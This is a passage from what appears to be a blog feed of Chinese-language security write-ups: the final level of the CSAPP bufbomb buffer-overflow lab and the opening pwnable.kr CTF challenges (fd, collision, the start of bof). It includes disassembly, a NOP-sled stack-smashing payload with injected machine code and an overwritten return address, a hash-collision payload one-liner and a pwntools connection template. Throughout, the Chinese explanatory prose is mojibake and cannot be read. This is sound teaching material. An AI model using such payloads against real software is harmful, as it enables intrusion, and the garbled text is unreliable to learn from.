JOB!<br></code></pre></td></tr></table></figure><h1 id="Level-4-Nitroglycerin-10-pts"><a href="#Level-4-Nitroglycerin-10-pts" class="headerlink" title="Level 4: Nitroglycerin (10 pts)"></a>Level 4: Nitroglycerin (10 pts)</h1><p>è¦æ±‚ï¼š</p><ul><li>ä½¿ç”¨-né€‰é¡¹è¿è¡Œï¼Œè¿™ä¼šä½¿ç¨‹åºè°ƒç”¨testnã€getbufnå‡½æ•°ï¼Œè€Œéä¹‹å‰çš„testã€getbufå‡½æ•°</li><li>getbufnå‡½æ•°ä¼šè¢«è°ƒç”¨5æ¬¡</li><li>æ¯ä¸€æ¬¡è¾“å…¥çš„å­—ç¬¦ä¸²éƒ½ç›¸åŒ</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">08048e26</span> &lt;testn&gt;:<br> <span class="hljs-attribute">8048e26</span>:<span class="hljs-number">55</span>                   push   %ebp<br> <span class="hljs-attribute">8048e27</span>:<span class="hljs-number">89</span> e<span class="hljs-number">5</span>                mov    %esp,%ebp<br> <span class="hljs-attribute">8048e29</span>:<span class="hljs-number">53</span>                   push   %ebx<br> <span class="hljs-attribute">8048e2a</span>:<span class="hljs-number">83</span> ec <span class="hljs-number">24</span>             sub    $<span class="hljs-number">0</span>x<span class="hljs-number">24</span>,%esp<br> <span class="hljs-attribute">8048e2d</span>:e<span class="hljs-number">8</span> <span class="hljs-number">5</span>e ff ff ff       call   <span class="hljs-number">8048</span>d<span class="hljs-number">90</span> &lt;uniqueval&gt;<br> <span class="hljs-attribute">8048e32</span>:<span class="hljs-number">89</span> <span class="hljs-number">45</span> f<span class="hljs-number">4</span>             mov    %eax,-<span class="hljs-number">0</span>xc(%ebp)<br> <span class="hljs-attribute">8048e35</span>:e<span class="hljs-number">8</span> d<span class="hljs-number">2</span> <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       call   <span class="hljs-number">804920</span>c &lt;getbufn&gt;<br> <span class="hljs-attribute">8048e3a</span>:<span class="hljs-number">89</span> c<span class="hljs-number">3</span>                mov    %eax,%ebx<br> <span class="hljs-attribute">8048e3c</span>:e<span class="hljs-number">8</span> <span class="hljs-number">4</span>f ff ff ff       call   <span class="hljs-number">8048</span>d<span class="hljs-number">90</span> &lt;uniqueval&gt;<br> <span class="hljs-attribute">8048e41</span>:<span class="hljs-number">8</span>b <span class="hljs-number">55</span> f<span class="hljs-number">4</span>             mov    -<span class="hljs-number">0</span>xc(%ebp),%edx<br> <span class="hljs-attribute">8048e44</span>:<span class="hljs-number">39</span> d<span class="hljs-number">0</span>                cmp    %edx,%eax<br> <span class="hljs-attribute">8048e46</span>:<span class="hljs-number">74</span> <span class="hljs-number">0</span>e                je     <span class="hljs-number">8048</span>e<span class="hljs-number">56</span> &lt;testn+<span class="hljs-number">0</span>x<span class="hljs-number">30</span>&gt;<br> <span class="hljs-attribute">8048e48</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">88</span> a<span class="hljs-number">3</span> <span class="hljs-number">04</span> <span class="hljs-number">08</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">388</span>,(%esp)<br> <span class="hljs-attribute">8048e4f</span>:e<span class="hljs-number">8</span> <span class="hljs-number">6</span>c fa ff ff       call   <span class="hljs-number">80488</span>c<span class="hljs-number">0</span> &lt;puts@plt&gt;<br> <span class="hljs-attribute">8048e54</span>:eb <span class="hljs-number">46</span>                jmp    <span class="hljs-number">8048</span>e<span class="hljs-number">9</span>c &lt;testn+<span class="hljs-number">0</span>x<span class="hljs-number">76</span>&gt;<br> <span class="hljs-attribute">8048e56</span>:<span class="hljs-number">3</span>b <span class="hljs-number">1</span>d <span class="hljs-number">08</span> d<span class="hljs-number">1</span> <span class="hljs-number">04</span> <span class="hljs-number">08</span>    cmp    <span class="hljs-number">0</span>x<span class="hljs-number">804</span>d<span class="hljs-number">108</span>,%ebx<br> <span class="hljs-attribute">8048e5c</span>:<span class="hljs-number">75</span> <span class="hljs-number">26</span>                jne    <span class="hljs-number">8048</span>e<span class="hljs-number">84</span> &lt;testn+<span class="hljs-number">0</span>x<span class="hljs-number">5</span>e&gt;<br> <span class="hljs-attribute">8048e5e</span>:<span class="hljs-number">89</span> <span class="hljs-number">5</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    %ebx,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%esp)<br> <span class="hljs-attribute">8048e62</span>:c<span class="hljs-number">7</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">04</span> b<span class="hljs-number">4</span> a<span class="hljs-number">3</span> <span class="hljs-number">04</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">3</span>b<span class="hljs-number">4</span>,<span class="hljs-number">0</span>x<span class="hljs-number">4</span>(%esp)<br> <span class="hljs-attribute">8048e69</span>:<span class="hljs-number">08</span> <br> <span class="hljs-attribute">8048e6a</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,(%esp)<br> <span class="hljs-attribute">8048e71</span>:e<span class="hljs-number">8</span> <span class="hljs-number">4</span>a fb ff ff       call   <span class="hljs-number">80489</span>c<span class="hljs-number">0</span> &lt;__printf_chk@plt&gt;<br> <span class="hljs-attribute">8048e76</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">4</span>,(%esp)<br> <span class="hljs-attribute">8048e7d</span>:e<span class="hljs-number">8</span> f<span class="hljs-number">9</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       call   <span class="hljs-number">804937</span>b &lt;validate&gt;<br> <span class="hljs-attribute">8048e82</span>:eb <span class="hljs-number">18</span>                jmp    <span class="hljs-number">8048</span>e<span class="hljs-number">9</span>c &lt;testn+<span class="hljs-number">0</span>x<span class="hljs-number">76</span>&gt;<br> <span class="hljs-attribute">8048e84</span>:<span class="hljs-number">89</span> <span class="hljs-number">5</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    %ebx,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%esp)<br> <span class="hljs-attribute">8048e88</span>:c<span class="hljs-number">7</span> <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">04</span> <span class="hljs-number">62</span> a<span class="hljs-number">5</span> <span class="hljs-number">04</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">562</span>,<span class="hljs-number">0</span>x<span class="hljs-number">4</span>(%esp)<br> <span class="hljs-attribute">8048e8f</span>:<span class="hljs-number">08</span> <br> <span class="hljs-attribute">8048e90</span>:c<span class="hljs-number">7</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> movl   $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,(%esp)<br> <span class="hljs-attribute">8048e97</span>:e<span class="hljs-number">8</span> <span class="hljs-number">24</span> fb ff ff       call   <span class="hljs-number">80489</span>c<span class="hljs-number">0</span> &lt;__printf_chk@plt&gt;<br> <span class="hljs-attribute">8048e9c</span>:<span class="hljs-number">83</span> c<span class="hljs-number">4</span> <span class="hljs-number">24</span>             add    $<span class="hljs-number">0</span>x<span class="hljs-number">24</span>,%esp<br> <span class="hljs-attribute">8048e9f</span>:<span class="hljs-number">5</span>b                   pop    %ebx<br> <span class="hljs-attribute">8048ea0</span>:<span class="hljs-number">5</span>d                   pop    %ebp<br> <span class="hljs-attribute">8048ea1</span>:c<span class="hljs-number">3</span>                   ret    <br><br><span class="hljs-attribute">0804920c</span> &lt;getbufn&gt;:<br> <span class="hljs-attribute">804920c</span>:<span class="hljs-number">55</span>                   push   %ebp<br> <span class="hljs-attribute">804920d</span>:<span class="hljs-number">89</span> e<span class="hljs-number">5</span>                mov    %esp,%ebp<br> <span class="hljs-attribute">804920f</span>:<span class="hljs-number">81</span> ec <span class="hljs-number">18</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>    sub    $<span class="hljs-number">0</span>x<span class="hljs-number">218</span>,%esp<br> <span class="hljs-attribute">8049215</span>:<span class="hljs-number">8</span>d <span class="hljs-number">85</span> f<span class="hljs-number">8</span> fd ff ff    lea    -<span class="hljs-number">0</span>x<span class="hljs-number">208</span>(%ebp),%eax<br> <span class="hljs-attribute">804921b</span>:<span class="hljs-number">89</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span>             mov    %eax,(%esp)<br> <span class="hljs-attribute">804921e</span>:e<span class="hljs-number">8</span> d<span class="hljs-number">7</span> fa ff ff       call   <span class="hljs-number">8048</span>cfa &lt;Gets&gt;<br> <span class="hljs-attribute">8049223</span>:b<span class="hljs-number">8</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%eax<br> <span class="hljs-attribute">8049228</span>:c<span class="hljs-number">9</span>                   leave  <br> <span class="hljs-attribute">8049229</span>:c<span class="hljs-number">3</span>                   ret    <br> <span class="hljs-attribute">804922a</span>:<span class="hljs-number">90</span>                   nop<br> <span class="hljs-attribute">804922b</span>:<span class="hljs-number">90</span>                   nop<br></code></pre></td></tr></table></figure><p>æ–­ç‚¹è°ƒè¯•ï¼š</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">b</span> testn<br><br><span class="hljs-keyword">b</span> getbufn<br><br><span class="hljs-symbol">run</span> -n -u nmsl &lt; exploit.txt<br></code></pre></td></tr></table></figure><p>åœ¨äº”æ¬¡è°ƒç”¨getbufçš„è¿‡ç¨‹ä¸­ï¼Œebpçš„å€¼ç»Ÿè®¡å¦‚ä¸‹ï¼š</p><p>testn<br>ebp:0x55683880ã€0x556838e0ã€0x55683800ã€0x55683880ã€0x55683840</p><p>getbuf<br>ebp:0x55683850ã€0x556838b0ã€0x556837d0ã€0x55683850ã€0x55683810</p><p>getbufnå¼€è¾Ÿçš„ç¼“å†²åŒºå¤§å°æ˜¯520ï¼Œä¹Ÿå³æ˜¯è¯´ï¼Œbuf[0]çš„åœ°å€æ˜¯ebp-520ï¼Œå› æ­¤buf[0]çš„åœ°å€æœ‰è¿™äº›å¯èƒ½ï¼š55683648ã€556836A8ã€556835C8ã€55683648ã€55683608ï¼Œ<strong>ä¸ºäº†ä¿è¯æ³¨å…¥ä»£ç éƒ½å¯ä»¥æ‰§è¡Œï¼Œé€‰æ‹©åœ°å€æœ€å¤§çš„556836A8ä½œä¸ºè¦†ç›–çš„è¿”å›åœ°å€</strong></p><p>æ³¨å…¥ä»£ç ï¼š</p><ul><li>å°†eaxèµ‹å€¼ä¸º$0x6185560e</li><li>æ¢å¤ebpï¼Œä¹Ÿå³æ˜¯å°†esp+0x28èµ‹ç»™ebp</li><li>pushè¿”å›åœ°å€ï¼Œret</li><li>è¦†ç›–è¿”å›åœ°å€</li></ul><p>exploit.txt:</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs tap">515 +<span class="hljs-number"> 15 </span>+<span class="hljs-number"> 4 </span>+ 4<br><br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90<br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90<br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90<br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90<br><br>// ...... ä¸€å…±æ˜¯515ä¸ª0x90<br><br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90<br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90<br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90<br>b8 0e<span class="hljs-number"> 56 </span>85<span class="hljs-number"> 61 </span>//æ³¨å…¥çš„äºŒè¿›åˆ¶ä»£ç <br>8d 6c<span class="hljs-number"> 24 </span>28 <br>68 3a 8e<span class="hljs-number"> 04 </span>08 <br>c3<br>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>  //ebp<br>A8<span class="hljs-number"> 36 </span>68<span class="hljs-number"> 55 </span>  //è¿”å›åœ°å€ï¼Œè·³è½¬åˆ°buf[0]<br></code></pre></td></tr></table></figure><p>æµ‹è¯•ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cat</span> exploit.txt | ./hex<span class="hljs-number">2</span>raw -n | ./bufbomb -n -u nmsl<br><br><span class="hljs-attribute">Userid</span>: nmsl<br><span class="hljs-attribute">Cookie</span>: <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">Type</span> string:KABOOM!: getbufn returned <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">Keep</span> going<br><span class="hljs-attribute">Type</span> string:KABOOM!: getbufn returned <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">Keep</span> going<br><span class="hljs-attribute">Type</span> string:KABOOM!: getbufn returned <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">Keep</span> going<br><span class="hljs-attribute">Type</span> string:KABOOM!: getbufn returned <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">Keep</span> going<br><span class="hljs-attribute">Type</span> string:KABOOM!: getbufn returned <span class="hljs-number">0</span>x<span class="hljs-number">6185560</span>e<br><span class="hljs-attribute">VALID</span><br><span class="hljs-attribute">NICE</span> JOB!<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwnable.kr åˆ·é¢˜è®°å½•</title>
    <link href="/p/f57f952b/"/>
    <url>/p/f57f952b/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/pwnable.png"></p><h1 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h1><p><strong>ä½¿ç”¨sshè¿æ¥åˆ°è¿œç¨‹shell</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh fd@pwnable.kr -p2222 (pw:guest)<br></code></pre></td></tr></table></figure><p><strong>ä½¿ç”¨scpå°†è¿œç¨‹æ–‡ä»¶ä¼ è¾“åˆ°æœ¬åœ°</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"> - Use a specific port when connecting to the remote host:<br>   scp -P &#123;&#123;port&#125;&#125; &#123;&#123;path/to/local_file&#125;&#125; &#123;&#123;remote_host&#125;&#125;:&#123;&#123;path/to/remote_file&#125;&#125;<br><br>scp -P 2222  username@pwnable.kr:/home/username/* .<br></code></pre></td></tr></table></figure><p><strong>ä½¿ç”¨pwntoolsè¿œç¨‹è¿æ¥åˆ°æœåŠ¡å™¨å¹¶è¿è¡Œç¨‹åº</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>ssh = ssh(host=<span class="hljs-string">&#x27;pwnable.kr&#x27;</span>,user=<span class="hljs-string">&#x27;&#x27;</span>,password=<span class="hljs-string">&#x27;&#x27;</span>,port=)<br>sh=ssh.process(<span class="hljs-string">&#x27;./xxx&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./xxx&#x27;</span>)<br><br>sh.recv()<br><br>payload=<br><br>sh.sendline(payload)<br></code></pre></td></tr></table></figure><h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1><p>çœ‹ä¸€ä¸‹fdç¨‹åºçš„æºç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c">$ cat fd.c<br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">char</span> buf[<span class="hljs-number">32</span>];<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[], <span class="hljs-keyword">char</span>* envp[])</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(argc&lt;<span class="hljs-number">2</span>)&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pass argv[1] a number\n&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">int</span> fd = atoi( argv[<span class="hljs-number">1</span>] ) - <span class="hljs-number">0x1234</span>;<br>        <span class="hljs-keyword">int</span> len = <span class="hljs-number">0</span>;<br>        len = read(fd, buf, <span class="hljs-number">32</span>);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;good job :)\n&quot;</span>);<br>                system(<span class="hljs-string">&quot;/bin/cat flag&quot;</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;learn about Linux file IO\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ä»¥<code>atoi( argv[1] ) - 0x1234</code>ä¸ºfdï¼Œåœ¨å…¶ä¸­è¯»å–32å­—èŠ‚çš„å­—ç¬¦ä¸²ï¼Œä¹‹åä¸LETMEWINæ¯”è¾ƒï¼Œå³å¯å¾—åˆ°flag</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cos">$ ./fd <span class="hljs-number">4660</span><br>LETMEWIN<br>good <span class="hljs-keyword">job</span> :)<br></code></pre></td></tr></table></figure><h1 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">$ cat col.c<br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> hashcode = <span class="hljs-number">0x21DD09EC</span>;<br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-title">check_password</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* p)</span></span>&#123;<br>        <span class="hljs-keyword">int</span>* ip = (<span class="hljs-keyword">int</span>*)p;<br>        <span class="hljs-keyword">int</span> i;<br>        <span class="hljs-keyword">int</span> res=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">5</span>; i++)&#123;<br>                res += ip[i];<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span>&#123;<br>        <span class="hljs-keyword">if</span>(argc&lt;<span class="hljs-number">2</span>)&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]) != <span class="hljs-number">20</span>)&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;passcode length should be 20 bytes\n&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(hashcode == check_password( argv[<span class="hljs-number">1</span>] ))&#123;<br>                system(<span class="hljs-string">&quot;/bin/cat flag&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong passcode.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¦è¾“å…¥20ä¸ªå­—èŠ‚ï¼Œæ¯å››ä¸ªå­—èŠ‚ï¼ˆäº”ä¸ªæ•°å­—ï¼‰ä¼šè¢«å½“åšintç±»å‹åŠ åœ¨ä¸€èµ·ï¼Œä¹Ÿå³æ˜¯$4*5=20$ã€‚è¿™äº”ä¸ªæ•°å­—çš„å’Œå¿…é¡»æ»¡è¶³æ˜¯0x21DD09ECï¼Œæ‰èƒ½å¾—åˆ°flag</p><p>æ‰“å¼€pythonï¼Œåšä¸€ä¸‹åŠ å‡ä¹˜é™¤</p><p>$0x21DD09EC=568134124/5=113626824.8$</p><p>$568134124-4*113626824=113626828$</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hex</span>(<span class="hljs-number">113626824</span>)=&#x27;<span class="hljs-number">0</span>x<span class="hljs-number">6</span>c<span class="hljs-number">5</span>cec<span class="hljs-number">8</span>&#x27;<br><span class="hljs-attribute">hex</span>(<span class="hljs-number">113626828</span>)=&#x27;<span class="hljs-number">0</span>x<span class="hljs-number">6</span>c<span class="hljs-number">5</span>cecc&#x27;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬æ„é€ 4ä¸ªâ€™0x6c5cec8â€™å’Œä¸€ä¸ª0x6c5ceccå°±è¡Œäº†</p><p>ç”±äºå°ç«¯åºï¼Œæˆ‘ä»¬éœ€è¦å°†å­—èŠ‚åºåˆ—ç¿»è½¬ä¸€ä¸‹</p><p>ç”±äºä¼šå‡ºç°ä¸å¯è§å­—ç¬¦ï¼Œæˆ‘ä»¬å¾ˆéš¾æŠŠå®ƒä»¬æ‰“å°å‡ºæ¥ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨python2çš„å‘½ä»¤è¡Œè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">./col `python -c <span class="hljs-string">&#x27;print &quot;\xc8\xce\xc5\x06&quot; * 4 + &quot;\xcc\xce\xc5\x06&quot;&#x27;</span>`<br></code></pre></td></tr></table></figure><h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><p>çœ‹ä¸€ä¸‹æºç ï¼Œå‘ç°æ˜¯ä¸€ä¸ªç®€å•çš„æ ˆæº¢å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">func</span><span class="hljs-params">(<span class="hljs-keyword">int</span> key)</span></span>&#123;<br>        <span class="hljs-keyword">char</span> overflowme[<span class="hljs-number">32</span>];<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;overflow me : &quot;</span>);<br>        gets(overflowme);       <span class="hljs-comment">// smash me!</span><br>        <span class="hljs-keyword">if</span>(key == <span class="hljs-number">0xcafebabe</span>)&#123;<br>                system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Nah..\n&quot;</span>);<br>        &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span>&#123;<br>        func(<span class="hljs-number">0xdeadbeef</span>);<br>        <span class="hljs-keyword">return</span> <span 